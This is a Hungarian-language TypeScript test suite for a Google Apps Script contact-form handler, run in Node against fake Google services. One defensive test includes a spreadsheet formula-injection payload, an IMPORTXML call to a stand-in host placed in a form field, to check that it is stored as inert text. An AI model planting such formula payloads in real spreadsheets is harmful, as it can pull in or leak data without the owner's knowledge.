// Az összeállított apps-script/Kod.gs futtatása Node-ban, a Google-szolgáltatások hamisítványaival.
import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { randomUUID } from 'node:crypto';
import vm from 'node:vm';
import { epit, KIMENET } from '../eszkozok/apps-script-epites.mjs';
import { mintaBekuldes } from './minta.ts';

type Sor = unknown[];

function hamisLap(nev: string) {
  const cellak: Sor[] = [];
  const formatumok: Array<[number, number, string]> = [];
  const lap: Record<string, any> = {
    nev, cellak, formatumok,
    getName: () => nev,
    getLastRow: () => cellak.length,
    getLastColumn: () => cellak.reduce((m, r) => Math.max(m, r.length), 0),
    getMaxRows: () => 1000,
    appendRow(sor: Sor) { cellak.push(Array.from(sor)); return lap; }, // Array.from: a vm-ből jött tömb főrealm-beli másolata
    getRange(r: number, c: number, nr = 1, nc = 1) { return tartomany(r, c, nr, nc); },
    setFrozenRows() { return lap; },
    setColumnWidth() { return lap; },
    deleteRows(kezdet: number, db: number) { cellak.splice(kezdet - 1, db); return lap; },
  };
  function tartomany(r: number, c: number, nr: number, nc: number): any {
    const t: any = new Proxy({}, {
      get(_c, p) {
        if (p === 'getValues') return () => Array.from({ length: nr }, (_x, i) => Array.from({ length: nc }, (_y, j) => {
          const v = (cellak[r - 1 + i] || [])[c - 1 + j];
          return v === undefined ? '' : v;
        }));
        if (p === 'setValues') return (ertekek: Sor[]) => {
          ertekek.forEach((sor, i) => { cellak[r - 1 + i] = cellak[r - 1 + i] || []; sor.forEach((v, j) => { cellak[r - 1 + i][c - 1 + j] = v; }); });
          return t;
        };
        if (p === 'setNumberFormat') return (f: string) => { formatumok.push([r, c, f]); return t; };
        return () => t; // minden más (setWrap, setFontWeight, setDataValidation…) láncolható no-op
      },
    });
    return t;
  }
  return lap;
}

function kornyezet() {
  const lapok: Record<string, any> = {};
  const levelek: any[] = [];
  const props: Record<string, string> = {};
  const cache: Record<string, string> = {};
  const naplo: string[] = [];
  const fetchHivasok: any[] = [];
  let fetchValasz: { kod: number; torzs: string } = { kod: 200, torzs: '{}' };
  const lanc: any = new Proxy({}, { get: () => () => lanc });
  const ss = {
    getSheetByName: (n: string) => lapok[n] || null,
    insertSheet: (n: string) => (lapok[n] = hamisLap(n)),
    setSpreadsheetTimeZone: () => undefined,
    getUrl: () => 'https://docs.google.com/spreadsheets/d/teszt/edit',
  };
  const ctx = vm.createContext({
    SpreadsheetApp: { getActiveSpreadsheet: () => ss, newDataValidation: () => lanc },
    MailApp: { sendEmail: (o: any) => levelek.push(o), getRemainingDailyQuota: () => 100 },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k: string) => (k in props ? props[k] : null), setProperty: (k: string, v: string) => { props[k] = v; } }) },
    CacheService: { getScriptCache: () => ({ get: (k: string) => (k in cache ? cache[k] : null), put: (k: string, v: string) => { cache[k] = v; } }) },
    LockService: { getScriptLock: () => ({ waitLock: () => undefined, releaseLock: () => undefined }) },
    Session: { getEffectiveUser: () => ({ getEmail: () => 'tulaj@pelda.hu' }) },
    Utilities: { getUuid: () => randomUUID() },
    UrlFetchApp: {
      fetch: (url: string, opciok: any) => {
        fetchHivasok.push({ url, opciok });
        return { getResponseCode: () => fetchValasz.kod, getContentText: () => fetchValasz.torzs };
      },
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (s: string) => ({ tartalom: s, setMimeType() { return this; } }),
    },
    Logger: { log: (s: string) => naplo.push(String(s)) },
    console: { log: () => undefined, error: () => undefined },
  });
  vm.runInContext(readFileSync(KIMENET, 'utf8'), ctx, { filename: 'Kod.gs' });
  return {
    ctx, lapok, levelek, props, cache, naplo, fetchHivasok,
    setFetch(kod: number, torzs: unknown) { fetchValasz = { kod, torzs: JSON.stringify(torzs) }; },
    post(torzs: unknown, kulcs?: string) {
      const e = { parameter: { kulcs: kulcs === undefined ? props.TITKOS_KULCS : kulcs }, postData: { contents: typeof torzs === 'string' ? torzs : JSON.stringify(torzs), type: 'application/json' } };
      return JSON.parse((ctx as any).doPost(e).tartalom);
    },
    futtat(kod: string) { return vm.runInContext(kod, ctx); },
  };
}

describe('Apps Script (A változat)', () => {
  test('a beillesztendő Kod.gs naprakész (npm run build:apps-script)', () => {
    assert.equal(readFileSync(KIMENET, 'utf8'), epit(), 'Futtasd: npm run build:apps-script');
  });

  let k: ReturnType<typeof kornyezet>;
  beforeEach(() => {
    k = kornyezet();
    (k.ctx as any).beallitas();
  });

  test('beallitas: lapok, fejlécek, titkos kulcs', () => {
    assert.deepEqual(k.lapok['Üzenetek'].cellak[0], ['Időpont', 'Név', 'E-mail', 'Telefon', 'Üzenet', 'Forrás oldal', 'Állapot', 'Azonosító']);
    assert.deepEqual(k.lapok['Hibanapló'].cellak[0], ['Időpont', 'Szint', 'Esemény', 'Részletek', 'Azonosító']);
    assert.match(k.props.TITKOS_KULCS, /^[0-9a-f]{64}$/);
    assert.ok(k.naplo.some((s) => s.includes('?kulcs=' + k.props.TITKOS_KULCS)));
    const regi = k.props.TITKOS_KULCS;
    (k.ctx as any).beallitas(); // újrafuttatás nem írja felül a kulcsot és nem duplázza a fejlécet
    assert.equal(k.props.TITKOS_KULCS, regi);
    assert.equal(k.lapok['Üzenetek'].cellak.length, 1);
  });

  test('hibás vagy hiányzó kulcs → elutasítás, nincs sor, nincs levél, de napló van', () => {
    assert.deepEqual(k.post(mintaBekuldes(), 'rossz'), { ok: false });
    assert.deepEqual(k.post(mintaBekuldes(), ''), { ok: false });
    assert.equal(k.lapok['Üzenetek'].cellak.length, 1);
    assert.equal(k.levelek.length, 0);
    assert.match(String(k.lapok['Hibanapló'].cellak[1][2]), /Elutasítva/);
  });

  test('új üzenet → sor (Állapot = Új) + értesítő; ismételt webhook → nincs második sor', () => {
    assert.deepEqual(k.post(mintaBekuldes()), { ok: true, eredmeny: 'uj' });
    const sor = k.lapok['Üzenetek'].cellak[1];
    assert.equal(typeof sor[0].getTime, 'function');
    assert.equal(sor[0].getTime(), Date.parse('2026-11-05T13:32:10.000Z'));
    assert.deepEqual(sor.slice(1), ['Kiss Anna', 'anna.kiss@pelda.hu', "'+36 30 123 4567", sor[4], 'https://pelda.netlify.app/kapcsolat/', 'Új', '6727a3f0c1e2b40008a1b2c3']);
    assert.ok(k.lapok['Üzenetek'].formatumok.some((f: any) => f[0] === 2 && f[1] === 1));

    assert.equal(k.levelek.length, 1);
    assert.equal(k.levelek[0].to, 'tulaj@pelda.hu');
    assert.equal(k.levelek[0].replyTo, 'anna.kiss@pelda.hu');
    assert.equal(k.levelek[0].subject, 'Új üzenet a weboldalról: Kiss Anna');
    assert.match(k.levelek[0].htmlBody, /Kiss Anna/);
    assert.match(k.levelek[0].body, /Mikor tudnánk beszélni\?/);

    assert.deepEqual(k.post({ payload: mintaBekuldes() }), { ok: true, eredmeny: 'duplikatum' });
    assert.equal(k.lapok['Üzenetek'].cellak.length, 2);
    assert.equal(k.levelek.length, 1);
    assert.match(String(k.lapok['Hibanapló'].cellak.at(-1)[2]), /Ismétlődés/);
  });

  test('képlet a mezőben szövegként kerül a táblázatba', () => {
    k.post(mintaBekuldes({}, { nev: '=IMPORTXML("http://rossz.example","//a")', uzenet: '+1 kérdés' }));
    const sor = k.lapok['Üzenetek'].cellak[1];
    assert.equal(sor[1], '\'=IMPORTXML("http://rossz.example","//a")');
    assert.equal(sor[4], "'+1 kérdés");
  });

  test('spam → „Spam?” sor, levél nélkül; visszaigazolás csak bekapcsolva és rendes üzenetnél', () => {
    k.futtat('BEALLITASOK.visszaigazolas = true; BEALLITASOK.ertesitesCimzett = "iroda@pelda.hu";');
    assert.equal(k.post(mintaBekuldes({ id: 'spam1' }, { 'bot-field': 'x', uzenet: 'Olcsó linkek' })).eredmeny, 'spam');
    assert.equal(k.lapok['Üzenetek'].cellak[1][6], 'Spam?');
    assert.equal(k.levelek.length, 0);

    assert.equal(k.post(mintaBekuldes()).eredmeny, 'uj');
    assert.equal(k.levelek.length, 2);
    assert.equal(k.levelek[0].to, 'iroda@pelda.hu');
    assert.equal(k.levelek[1].to, 'anna.kiss@pelda.hu');
    assert.equal(k.levelek[1].replyTo, 'iroda@pelda.hu');
    assert.equal(k.levelek[1].subject, 'Megkaptuk az üzeneted – Folyam Studio');
  });

  test('elárasztás: 4. üzenet ugyanattól egy órán belül → „Túl sok üzenet”, levél nélkül', () => {
    for (let i = 1; i <= 4; i++) k.post(mintaBekuldes({ id: 'x' + i, created_at: new Date(Date.parse('2026-11-05T13:00:00Z') + i * 60000).toISOString() }, { uzenet: 'Kérdés ' + i }));
    const allapotok = k.lapok['Üzenetek'].cellak.slice(1).map((s: Sor) => s[6]);
    assert.deepEqual(allapotok, ['Új', 'Új', 'Új', 'Túl sok üzenet']);
    assert.equal(k.levelek.length, 3);
  });

  test('csak a megadott űrlapok; hibás JSON → hibanapló', () => {
    k.futtat('BEALLITASOK.urlapok = ["hirlevel"];');
    assert.match(k.post(mintaBekuldes()).eredmeny, /kihagyva/);
    assert.equal(k.lapok['Üzenetek'].cellak.length, 1);
    assert.deepEqual(k.post('{nem json'), { ok: false });
    assert.equal(k.lapok['Hibanapló'].cellak.at(-1)[1], 'HIBA');
  });

  test('megőrzési idő: a régi sorok törlődnek, a frissek maradnak (az időpont-oszlop helyétől függetlenül)', () => {
    const nap = 86400000;
    const most = Date.now();
    const lap = k.lapok['Üzenetek'];
    lap.cellak[0] = ['Név', 'Időpont', 'Állapot'];
    lap.cellak.push(['regi1', new Date(most - 400 * nap), 'Új'], ['regi2', new Date(most - 366 * nap), 'Új'], ['friss', new Date(most - 10 * nap), 'Új'], ['regi3', new Date(most - 500 * nap), 'Lezárva'], ['ures', '', 'Új']);
    (k.ctx as any).regiUzenetekTorlese();
    assert.deepEqual(lap.cellak.slice(1).map((s: Sor) => s[0]), ['friss', 'ures']);
    assert.match(String(k.lapok['Hibanapló'].cellak.at(-1)[3]), /^3 sor törölve \(365 napnál régebbi\)/);
  });

  test('szigorú mód (NETLIFY_API_TOKEN): ismeretlen beküldés elutasítva, ismertnél az API adata számít', () => {
    k.props.NETLIFY_API_TOKEN = 'nfp_teszt';
    k.setFetch(404, { code: 404 });
    assert.deepEqual(k.post(mintaBekuldes()), { ok: false });
    assert.equal(k.lapok['Üzenetek'].cellak.length, 1);
    assert.equal(k.fetchHivasok[0].url, 'https://api.netlify.com/api/v1/submissions/6727a3f0c1e2b40008a1b2c3');
    assert.equal(k.fetchHivasok[0].opciok.headers.Authorization, 'Bearer nfp_teszt');

    k.setFetch(200, [mintaBekuldes({}, { nev: 'Valódi Név' })]);
    assert.equal(k.post(mintaBekuldes({}, { nev: 'Hamisított' })).eredmeny, 'uj');
    assert.equal(k.lapok['Üzenetek'].cellak[1][1], 'Valódi Név');
  });
});
